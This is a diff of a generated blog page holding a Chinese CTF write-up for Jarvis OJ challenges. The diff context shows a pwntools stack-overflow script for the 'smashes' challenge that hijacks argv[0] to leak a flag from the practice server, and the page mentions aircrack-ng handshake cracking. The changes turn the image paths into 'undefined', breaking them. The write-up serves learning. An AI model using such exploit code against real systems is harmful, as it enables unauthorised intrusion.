@@ -127,12 +127,12 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="BASIC 德军的密码 费纳姆密码,密钥长度12位,密文长度84位,密文7位一组. 将密文七位一组转成数字以后与密钥进行各种运算,最终试出是异或. 关于USS Lab google即可. veryeasy UTF-8打开发现flag字符串. Help!! binwalk -e即可. 握手包 aircrack-ng -w password.txt wifi.cap. shel">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://hitworld.github.io/posts/1699a56d/1.png">
-<meta property="og:updated_time" content="2020-08-29T07:48:28.945Z">
+<meta property="og:image" content="https://hitworld.github.io/posts/undefined/1.png">
+<meta property="og:updated_time" content="2020-09-08T12:39:08.071Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-Jarvis">
 <meta name="twitter:description" content="BASIC 德军的密码 费纳姆密码,密钥长度12位,密文长度84位,密文7位一组. 将密文七位一组转成数字以后与密钥进行各种运算,最终试出是异或. 关于USS Lab google即可. veryeasy UTF-8打开发现flag字符串. Help!! binwalk -e即可. 握手包 aircrack-ng -w password.txt wifi.cap. shel">
-<meta name="twitter:image" content="https://hitworld.github.io/posts/1699a56d/1.png">
+<meta name="twitter:image" content="https://hitworld.github.io/posts/undefined/1.png">
 
 
 
@@ -571,7 +571,7 @@
 <p>所以只需要使<code>backdoor</code>被溢出写到返回地址即可.所以参数为<code>0x24 ^ 0x6443</code>.</p>
 <h3 id="smashes">smashes</h3>
 <p>当<code>ELF</code>文件比较小的时候,不同区段可能会被多次映射.</p>
-<img src="/posts/1699a56d/1.png" title="p1">
+<img src="/posts/undefined/1.png" title="p1">
 <p>劫持<code>argv[0]</code>即可.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./smashes")</span></span><br><span class="line">r = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="string">"9877"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"What's your name? "</span>)</span><br><span class="line">r.sendline(<span class="string">"a"</span> * <span class="number">0x218</span> + p64(<span class="number">0x400d20</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"overwrite the flag: "</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"terminated"</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="typo">typo</h3>
@@ -733,7 +733,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">174</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -957,7 +957,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">737k</span>
   
 
   
@@ -966,7 +966,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">11:10</span>
   
 </div>
 
